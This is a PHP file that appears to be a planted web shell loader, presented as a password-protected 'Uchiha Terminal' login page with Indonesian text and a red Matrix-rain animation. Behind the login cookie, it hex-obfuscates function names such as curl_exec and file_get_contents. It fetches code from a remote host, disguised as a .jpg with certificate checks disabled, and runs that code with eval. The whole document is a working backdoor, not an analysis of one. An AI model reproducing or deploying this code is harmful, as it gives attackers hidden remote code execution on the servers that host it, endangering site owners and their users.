<?php
/**
 * @package    
 * @copyright  
 */

function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'tuwaga1337'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563'
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array_map('hex2str', $GLOBALS['Array']);
        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://choexoftbarbar.pages.dev/nenen.jpg';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$z6spe74OA3P3NnfOrrdn9e5E6qcCQyLPjfQbD20DfsD7H.PDHMy.e'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'tuwaga1337', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
?>

<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Uchiha Terminal | Restricted</title>

<style>
:root {
  --blood-red: #8b0000;
  --bright-red: #ff0000;
  --deep-black: #050505;
}

body {
  margin: 0;
  padding: 0;
  font-family: 'Courier New', monospace;
  background-color: var(--deep-black);
  /* Gambar background utama */
  background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://i.pinimg.com/1200x/70/3e/90/703e901b36c5ed42fdf51d65c19a8042.jpg');
  background-size: cover;
  background-position: center;
  background-attachment: fixed;
  color: var(--bright-red);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  overflow: hidden;
}

/* Rain Effect Canvas */
canvas {
  position: fixed;
  top: 0;
  left: 0;
  z-index: 0;
  opacity: 0.3;
  pointer-events: none;
}

.container {
  width: 350px;
  padding: 40px 30px;
  background: rgba(0, 0, 0, 0.85); /* Box hitam transparan pekat */
  border: 2px solid var(--blood-red);
  box-shadow: 0 0 50px rgba(139, 0, 0, 0.6);
  border-radius: 2px;
  text-align: center;
  position: relative;
  z-index: 2;
  backdrop-filter: blur(5px);
}

.title {
  font-size: 18px;
  letter-spacing: 2px;
  margin-bottom: 25px;
  text-shadow: 0 0 15px var(--bright-red);
  font-weight: bold;
}

input {
  width: 100%;
  padding: 15px;
  margin: 15px 0;
  background: rgba(0,0,0,0.9);
  border: 1px solid var(--blood-red);
  color: #fff;
  border-radius: 0;
  outline: none;
  font-family: monospace;
  box-sizing: border-box;
  text-align: center;
  letter-spacing: 5px;
}

input:focus {
  border-color: var(--bright-red);
  box-shadow: 0 0 10px var(--blood-red);
}

button {
  width: 100%;
  padding: 12px;
  background: var(--blood-red);
  color: #fff;
  text-transform: uppercase;
  letter-spacing: 3px;
  font-weight: bold;
  border: none;
  cursor: pointer;
  transition: all 0.4s ease;
}

button:hover {
  background: var(--bright-red);
  box-shadow: 0 0 30px var(--bright-red);
  letter-spacing: 5px;
}

.footer {
  margin-top: 25px;
  font-size: 10px;
  letter-spacing: 2px;
  opacity: 0.7;
  color: #aaa;
}

@keyframes flicker {
  0% { opacity: 0.8; }
  50% { opacity: 1; }
  100% { opacity: 0.9; }
}

#typing {
  animation: flicker 0.1s infinite;
}
</style>
</head>

<body>

<canvas id="genjutsu"></canvas>

<div class="container">
  <div class="title" id="typing"></div>

  <!-- Form menggunakan method POST sesuai script PHP asli -->
  <form method="POST">
    <input type="password" name="password" placeholder="PASSWORD" required autofocus>
    <button type="submit">MASUKKAN PASSWORD NYA BANG</button>
  </form>

  <div class="footer">JENDRAL K4NC1L IS HERE</div>
</div>

<script>
const canvas = document.getElementById("genjutsu");
const ctx = canvas.getContext("2d");

canvas.height = window.innerHeight;
canvas.width = window.innerWidth;

const alphabet = "アイウエオカキクケコサシスセソタチツテトABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const fontSize = 16;
const columns = canvas.width / fontSize;
const rainDrops = Array.from({ length: columns }).fill(canvas.height);

function draw() {
  ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  ctx.fillStyle = "#ff0000"; 
  ctx.font = fontSize + "px monospace";

  for (let i = 0; i < rainDrops.length; i++) {
    const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
    ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);

    if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
      rainDrops[i] = 0;
    }
    rainDrops[i]++;
  }
}

setInterval(draw, 50);

const message = "root@system:-$ I’M K4NC1L";
let index = 0;
function type() {
  if (index < message.length) {
    document.getElementById("typing").innerHTML += message.charAt(index);
    index++;
    setTimeout(type, 100);
  }
}
type();

window.onresize = () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
};
</script>

</body>
</html>

<?php } ?>
